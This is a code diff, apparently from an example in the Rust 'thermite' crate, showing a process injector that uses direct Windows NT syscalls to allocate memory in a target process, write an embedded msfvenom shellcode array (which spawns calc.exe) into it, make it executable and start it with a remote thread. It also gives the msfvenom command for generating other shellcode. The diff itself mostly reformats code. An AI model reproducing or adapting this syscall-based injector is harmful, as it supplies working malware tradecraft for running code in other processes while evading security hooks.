@@ -3,8 +3,7 @@ use std::ptr::null;
 use std::{mem, process};
 use std::fmt::format;
 
-use thermite::models::windows::nt_status::NtStatus;
-// Only needed for printing the status after each syscalls
+use thermite::models::windows::nt_status::NtStatus;     // Only needed for printing the status after each syscalls
 use thermite::models::windows::peb_teb::UNICODE_STRING; //
 
 use thermite::{debug, error, info, syscall};
@@ -48,11 +47,10 @@ const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
 /// A basic msfvenom shellcode, just spawns calc.exe
 ///
 /// Remember, Stranger Danger,
-/// Just go get your own shellcode, you can generate it using the following command:
+/// Go get your own shellcode, you can generate it using the following command:
 /// ```bash
 /// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
 /// ```
-///
 const POP_CALC: [u8; 276] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -74,21 +72,16 @@ const POP_CALC: [u8; 276] = [
     0x65, 0x78, 0x65, 0x00,
 ];
 
-////
-///        UTILITY FUNCTIONS
-////
 
-// Helps us handle the values returned by the syscalls, transmutes the int32 into an actual NT_STATUS
-//
-// It's just for quality of life during debugging, the program can work just as well without it
+// Utility function that handles the return value of syscalls and quits if it's not a success
 fn print_status(str: &str, x: i32) -> NtStatus {
     let nt_status: NtStatus = unsafe { mem::transmute(x) };
     match nt_status {
         NtStatus::StatusSuccess => {
-	        info!(format!("{}: {}", str, nt_status))
+            info!("{}: {}", str, nt_status);
         }
         _ => {
-	        error!(nt_status);
+            error!(nt_status);
             process::exit(nt_status as _);
         }
     }
@@ -134,8 +127,8 @@ fn injector(pid: Option<u32>) {
 
     // If we have a target PID,
     // we go get a real handle to the target process
-	// Else we'll  just continue with the pseudo handle
-	if let Some(pid) = pid {
+    // Else we'll  just continue with the pseudo handle
+    if let Some(pid) = pid {
         let client_id = ClientId {
             unique_process: pid as _,
             unique_thread: 0 as _,
@@ -163,22 +156,20 @@ fn injector(pid: Option<u32>) {
         PAGE_READWRITE,           // [in]      ULONG     Protect
     );
     print_status("NtAllocateVirtualMemory status:", nt_status);
-    println!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");
-    //[^-^] Allocated 4096 bytes of memory at address 0x00000XXXXXXXXXXX
+    info!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");
 
     // Copy the shellcode to newly allocated memory
     let mut bytes_written: usize = 0;
     let nt_status = syscall!(
         "NtWriteVirtualMemory",
-        process_handle, // [in]              HANDLE    ProcessHandle,
-        base_addr,      // [in]              PVOID     *BaseAddress,
-        &POP_CALC,      // [in]              PVOID     Buffer,
-        buf_size,       // [in]              ULONG     NumberOfBytesToWrite,
-        &mut bytes_written
-    ); // [out, optional]   PULONG    NumberOfBytesWritten ,
+        process_handle,     // [in]              HANDLE    ProcessHandle,
+        base_addr,          // [in]              PVOID     *BaseAddress,
+        &POP_CALC,          // [in]              PVOID     Buffer,
+        buf_size,           // [in]              ULONG     NumberOfBytesToWrite,
+        &mut bytes_written, // [out, optional]   PULONG    NumberOfBytesWritten ,
+    );
     print_status("NtWriteVirtualMemory", nt_status);
-
-    println!("[^-^] Successfully written {buf_size} bytes in remote memory");
+    info!("[^-^] Successfully written {buf_size} bytes in remote memory");
 
     // Change protection status of allocated memory to READ+EXECUTE
     let mut bytes_written = POP_CALC.len();
@@ -193,7 +184,7 @@ fn injector(pid: Option<u32>) {
     );
     print_status("NtProtectVirtualMemory", nt_status);
 
-    // Create a remote thread in target process
+    // Creates a remote thread in target process
     let nt_status = syscall!(
         "NtCreateThreadEx",
         &mut thread_handle,    // [out]            PHANDLE ThreadHandle,
@@ -214,21 +205,20 @@ fn injector(pid: Option<u32>) {
     // Timeout is a null pointer, so we wait indefinitely
     let nt_status = syscall!(
         "NtWaitForSingleObject",
-        thread_handle, //  [in] HANDLE         Handle,
-        0,             //  [in] BOOLEAN        Alertable,
-        null::<*mut c_void>()
-    ); //  [in] PLARGE_INTEGER Timeout
-
+        thread_handle,          //  [in] HANDLE         Handle,
+        0,                      //  [in] BOOLEAN        Alertable,
+        null::<*mut c_void>(),  //  [in] PLARGE_INTEGER Timeout
+    );
     print_status("NtWaitForSingleObject", nt_status);
 
     // Close the handle
     let nt_status = syscall!(
         "NtClose",
-        thread_handle // [in] HANDLE Handle
+        thread_handle, // [in] HANDLE Handle
     );
     print_status("NtClose", nt_status);
 }
 
 fn main() {
-	injector(read_pid());
+    injector(read_pid());
 }
